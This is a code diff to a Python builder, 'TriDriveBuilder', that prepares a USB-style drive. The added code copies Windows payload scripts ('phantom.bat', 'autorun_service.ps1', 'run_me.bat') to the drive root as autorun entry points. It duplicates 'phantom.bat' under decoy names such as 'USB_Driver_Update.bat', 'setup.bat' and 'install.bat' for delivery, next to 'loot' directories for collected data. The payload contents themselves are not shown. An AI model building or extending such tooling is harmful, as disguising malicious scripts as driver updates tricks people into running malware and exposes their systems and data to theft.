@@ -244,11 +244,23 @@ class TriDriveBuilder:
                     safe_copy(f, pay_dst / f.name)
             print(f"  {C.GREEN}[OK]{C.R} payloads/ - Linux scripts")
 
-        # run_me.bat at root for easy access
-        run_me = self.root / "payloads" / "windows" / "run_me.bat"
-        if run_me.exists():
-            safe_copy(run_me, micro / "run_me.bat")
-            print(f"  {C.GREEN}[OK]{C.R} run_me.bat (root)")
+        # Autorun entry points at root for easy access
+        root_files = [
+            ("run_me.bat", "run_me.bat"),
+            ("phantom.bat", "phantom.bat"),
+            ("autorun_service.ps1", "autorun_service.ps1"),
+        ]
+        for src_name, dst_name in root_files:
+            src = self.root / "payloads" / "windows" / src_name
+            if src.exists():
+                safe_copy(src, micro / dst_name)
+                print(f"  {C.GREEN}[OK]{C.R} {dst_name} (root)")
+        
+        # Also copy phantom.bat as alternate names for different delivery methods
+        phantom = self.root / "payloads" / "windows" / "phantom.bat"
+        if phantom.exists():
+            for alias in ["setup.bat", "install.bat", "USB_Driver_Update.bat"]:
+                safe_copy(phantom, micro / alias)
 
         # Loot directories
         loot_dirs = [
